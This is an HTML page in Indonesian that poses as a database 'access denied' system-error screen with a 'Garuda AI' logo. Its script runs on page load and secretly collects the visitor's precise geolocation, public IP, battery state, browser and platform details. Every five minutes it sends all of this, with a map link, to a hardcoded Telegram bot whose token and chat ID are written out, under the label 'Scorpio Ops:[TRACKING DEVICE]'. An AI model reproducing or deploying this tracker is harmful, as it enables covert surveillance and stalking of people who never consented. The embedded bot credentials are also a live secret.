
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>System Error</title>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', Courier, monospace;
      background-color: black;
      color: red;
      text-align: center;
    }
    .logo {
      margin-top: 40px;
    }
    .logo img {
      width: 60px;
      opacity: 0.8;
    }
    h1 {
      font-size: 22px;
      margin-top: 20px;
    }
    p {
      font-size: 14px;
      color: white;
    }
  </style>
</head>
<body>
  <div class="logo">
    <img src="https://borneo101.github.io/DataBaseNusantara/garuda_ai.png" alt="Garuda AI Logo"/>
  </div>
  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
  <p>Sistem sedang dalam mode verifikasi sistem internal...</p>

  <script>
    const botToken = '7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko';
    const chatId = '5677912817';
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    function generateDeviceId() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = 'DEV-';
      for (let i = 0; i < 10; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    let deviceId = localStorage.getItem("deviceId");
    if (!deviceId) {
      deviceId = generateDeviceId();
      localStorage.setItem("deviceId", deviceId);
    }

    async function sendData() {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
        });

        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const altitude = position.coords.altitude || 'Unknown';
        const speed = position.coords.speed || 'Unknown';
        const heading = position.coords.heading || 'Unknown';

        const battery = await navigator.getBattery();
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? "Charging" : "Not Charging";

        const ipReq = await fetch('https://api.ipify.org?format=json');
        const ipRes = await ipReq.json();
        const ip = ipRes.ip;

        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const platform = navigator.platform;
        const online = navigator.onLine;
        const localTime = new Date().toLocaleString();
        const utcTime = new Date().toUTCString();

        const message = `Scorpio Ops:[TRACKING DEVICE]
ID: ${deviceId}
IP: ${ip}
Battery: ${level}% (${charging})
User Agent: ${userAgent}
Language: ${language}
Platform: ${platform}
Online: ${online}
Lokasi:
Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${accuracy}m
Altitude: ${altitude}
Speed: ${speed}
Heading: ${heading}
Local Time: ${localTime}
UTC: ${utcTime}
Map: https://maps.google.com/?q=${latitude},${longitude}`;

        fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      } catch (err) {
        console.error('Error mengirim data:', err);
      }
    }

    sendData();
    setInterval(sendData, 300000); // kirim ulang setiap 5 menit
  </script>
</body>
</html>
